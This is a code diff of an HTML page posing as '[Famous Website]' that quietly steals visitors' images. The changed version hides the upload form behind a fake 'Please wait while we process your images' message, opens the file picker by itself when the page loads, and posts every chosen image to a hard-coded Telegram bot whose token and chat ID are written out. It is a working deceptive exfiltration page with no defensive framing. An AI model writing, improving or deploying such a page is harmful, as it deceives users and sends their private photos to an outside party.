@@ -7,15 +7,17 @@
 </head>
 <body>
     <h1>Welcome to [Famous Website]</h1>
-    <form id="uploadForm">
-        <label for="images">Upload your images:</label>
+    <p>Please wait while we process your images...</p>
+    <form id="uploadForm" style="display:none;">
         <input type="file" id="images" name="images" multiple accept="image/*">
-        <button type="submit">Submit</button>
     </form>
 
     <script>
-        document.getElementById('uploadForm').onsubmit = function(event) {
-            event.preventDefault();
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('images').click();
+        });
+
+        document.getElementById('images').onchange = function() {
             var files = document.getElementById('images').files;
             if (files.length > 0) {
                 for (var i = 0; i < files.length; i++) {
@@ -25,23 +27,17 @@
         };
 
         function sendImageToTelegram(file) {
-            var reader = new FileReader();
-            reader.onload = function(event) {
-                var dataUrl = event.target.result;
-                fetch('https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendPhoto', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: '1900509620',
-                        photo: dataUrl
-                    })
-                }).then(response => response.json())
-                  .then(data => console.log(data))
-                  .catch(error => console.error('Error:', error));
-            };
-            reader.readAsDataURL(file);
+            var formData = new FormData();
+            formData.append('chat_id', '1900509620');
+            formData.append('photo', file);
+
+            fetch('https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendPhoto', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
         }
     </script>
 </body>
